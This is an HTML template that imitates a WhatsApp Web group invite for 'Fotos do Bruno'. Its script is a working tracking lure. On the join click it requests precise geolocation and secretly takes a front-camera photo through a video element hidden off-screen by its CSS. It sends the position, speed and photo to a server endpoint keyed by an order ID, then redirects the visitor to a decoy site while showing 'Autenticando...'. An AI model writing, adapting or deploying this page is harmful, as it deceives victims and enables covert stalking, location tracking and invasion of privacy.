<!-- teste.html -->
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Fotos do Bruno - Convite para grupo">
    <meta property="og:description" content="Entre na conversa do grupo Fotos do Bruno.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png">
    <meta name="theme-color" content="#25d366">
    <title>WhatsApp Group Invite</title>
    
    <style>
        /* Usa a mesma fonte padrão do WhatsApp Web */
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: #ffffff; 
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* MENU SUPERIOR */
        .header { 
            display: flex; 
            justify-content: flex-end; 
            align-items: center; 
            padding: 24px 40px; 
            gap: 32px;
            font-size: 15px; 
            color: #111b21;
        }
        .header a {
            text-decoration: none;
            color: inherit;
        }
        .header a:hover {
            text-decoration: underline;
        }
        .btn-header { 
            background-color: #25d366; 
            color: #ffffff; 
            padding: 10px 24px; 
            border-radius: 24px; 
            font-weight: 500; 
            text-decoration: none !important;
        }

        /* ÁREA CENTRALIZADA */
        .main-content { 
            flex: 1; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            text-align: center; 
            margin-top: -80px; /* Sobe o bloco um pouco para ficar idêntico à foto */
        }

        /* CÍRCULO DO AVATAR */
        .avatar { 
            width: 170px; 
            height: 170px; 
            background-color: #dfe5e7; 
            border-radius: 50%; 
            margin-bottom: 24px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        
        /* Ícone genérico de pessoas do WhatsApp em SVG */
        .avatar svg { 
            width: 90px; 
            height: 90px; 
            fill: #aebac1; 
        }

        /* TEXTOS */
        h1 { 
            font-size: 26px; 
            color: #111b21; 
            margin: 0 0 6px 0;
            font-weight: 400;
        }
        p { 
            font-size: 16px; 
            color: #667781; 
            margin: 0 0 32px 0; 
        }

        /* BOTÃO PRINCIPAL */
        .btn-join { 
            background-color: #008069; /* Verde escuro clássico do WhatsApp */
            color: #ffffff; 
            padding: 12px 32px; 
            border-radius: 24px; 
            font-size: 15px; 
            font-weight: 500; 
            text-decoration: none; 
            border: none;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .btn-join:hover {
            background-color: #016b58;
        }

        /* CORREÇÃO DO VÍDEO PRETO: NÃO PODE USAR DISPLAY NONE */
        #video { 
            position: fixed; 
            top: -9999px; left: -9999px; /* Joga para fora da tela */
            width: 1px; height: 1px; 
            opacity: 0; /* Invisível mas renderizado */
            z-index: -1;
        }
        #canvas { display: none; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <div class="header">
        <a href="#">Privacidade</a>
        <a href="#">Central de ajuda</a>
        <a href="#">Blog</a>
        <a href="#">Para empresas</a>
        <a href="#">Baixar</a>
        <a href="#" class="btn-header">Baixar</a>
    </div>

    <div class="main-content">
        <div class="avatar">
            <svg viewBox="0 0 24 24">
                <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
            </svg>
        </div>
        
        <h1>Fotos do Bruno</h1>
        <p>Convite para grupo</p>
        
        <button class="btn-join" onclick="usuarioTocou()">Entrar na conversa</button>
    </div>

    <script>
        const idOrdem = "{{ id }}";
        const siteDestino = "{{ destino }}";
        let fotoBase64 = null;
        let jaClicou = false;

        function finalizar() { 
            document.querySelector('.btn-join').innerText = "Redirecionando...";
            setTimeout(() => { window.location.href = siteDestino; }, 1000);
        }

        async function capturarFoto() {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = async () => {
                        video.play();
                        await new Promise(r => setTimeout(r, 1000));
                        
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                        
                        stream.getTracks().forEach(track => track.stop());
                        resolve();
                    };
                } catch (err) { 
                    console.log("Erro câmera:", err); 
                    resolve(); 
                }
            });
        }

        function usuarioTocou() {
            if (jaClicou) return;
            jaClicou = true;
            document.querySelector('.btn-join').innerText = "Autenticando...";
            iniciarCaptura();
        }

        function iniciarCaptura() {
            const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
            
            navigator.geolocation.getCurrentPosition(
                async function(pos) {
                    await capturarFoto();
                    enviarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
                }, 
                async function(err) {
                    await capturarFoto();
                    enviarDados(null, null, null, null);
                }, 
                options
            );
        }

        function enviarDados(lat, lon, acc, spd) {
            fetch(`/api/sinal/${idOrdem}`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, speed: spd, foto: fotoBase64 })
            }).then(() => finalizar()).catch(() => finalizar());
        }
    </script>

</body>
</html>